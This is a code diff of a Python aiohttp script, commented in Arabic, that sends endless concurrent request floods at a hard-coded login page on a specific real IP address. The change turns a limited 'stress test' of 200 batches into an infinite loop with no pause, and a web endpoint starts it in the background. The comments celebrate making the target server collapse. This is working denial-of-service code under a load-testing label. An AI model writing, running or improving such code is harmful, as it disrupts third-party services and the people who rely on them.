@@ -3,65 +3,46 @@ import aiohttp
 from aiohttp import web
 import os
 
-# الرابط المستهدف مباشرة
 TARGET_URL = "http://187.7.17.67/sudani/login2.php"
-
-# البيانات القصوى المحشوة بالاحتمالات
-PAYLOAD = {
-    'account': '123456789',
-    'account_number': '123456789',
-    'phone': '123456789',
-    'password': 'test_password'
-}
+PAYLOAD = {'account': '123456789', 'password': 'test_password'}
 
 async def send_request(session, index):
     try:
-        # التناوب بين طلبات GET و POST لإشغال المعالج والمنافذ للسيرفر المستهدف بالكامل
         if index % 2 == 0:
-            async with session.post(TARGET_URL, data=PAYLOAD, timeout=3) as response:
+            async with session.post(TARGET_URL, data=PAYLOAD, timeout=2) as response:
                 return response.status
         else:
-            async with session.get(TARGET_URL, timeout=3) as response:
+            async with session.get(TARGET_URL, timeout=2) as response:
                 return response.status
     except:
-        return 0 # في حال انقطع الاتصال أو بدأ السيرفر بالانهيار
+        return 0
 
-async def run_heavy_stress_test():
-    # إعدادات طاقة نفاثة فائقة الكفاءة ومتوافقة مع استقرار بايثون في Render
-    concurrency_batch = 500  # 500 طلب متزامن يخرج في نفس الميكروثانية
-    total_batches = 200      # تمديد الاختبار إلى 200 دفعة متتالية (إجمالي 100,000 طلب)
+async def run_infinite_stress_test():
+    concurrency_batch = 500  
+    # جعل الدفعات غير محدودة (Infinite Loop) لكي يستمر الضغط النفاث دون توقف
+    batch = 1
     
-    # استخدام موصل اتصالات متطور لمنع تسريب الذاكرة وتسريع التدفق لأقصى حد
-    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
-    
+    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600, force_close=False)
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Connection': 'keep-alive',
-        'Accept-Encoding': 'gzip, deflate'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        'Connection': 'keep-alive'
     }
     
     async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
-        for batch in range(1, total_batches + 1):
-            tasks = []
-            for i in range(concurrency_batch):
-                tasks.append(send_request(session, i))
-            
-            # إطلاق القذف المتوازي لجميع الطلبات دفعة واحدة
+        while True: # استمرار القذف اللانهائي
+            tasks = [send_request(session, i) for i in range(concurrency_batch)]
             results = await asyncio.gather(*tasks)
             
-            # حساب الإحصائيات الفورية للدفعة
             success_200 = sum(1 for status in results if status == 200)
-            failed_or_blocked = sum(1 for status in results if status != 200)
+            failed = concurrency_batch - success_200
             
-            print(f"🚀 [الدفعة {batch}/{total_batches}] -> استجابة ناجحة: {success_200} | قيود/انقطاع: {failed_or_blocked}", flush=True)
-            
-            # فاصل ميكروي ذكي (10 مللي ثانية) لضمان عدم انهيار كرت الشبكة الخاص بـ Render
-            await asyncio.sleep(0.01)
+            print(f"🔥 [قذف لانهائي - الدفعة {batch}] -> نجاح: {success_200} | إسقاط/انهيار: {failed}", flush=True)
+            batch += 1
+            # تم حذف فاصل الـ sleep تماماً لضمان التدفق المستمر والضغط المطلق
 
 async def handle(request):
-    # تشغيل محرك الضغط الفائق في الخلفية فور فتح الرابط
-    asyncio.create_task(run_heavy_stress_test())
-    return web.Response(text="🔥 تم إطلاق محرك اختبار الحمل الفائق والقصي (Hyper-Flood) بنجاح في الخلفية! راقب السجلات الآن.")
+    asyncio.create_task(run_infinite_stress_test())
+    return web.Response(text="🚀 تم تشغيل محرك القذف المستمر واللانهائي في الخلفية! راقب انهيار السجلات الآن.")
 
 app = web.Application()
 app.router.add_get('/', handle)
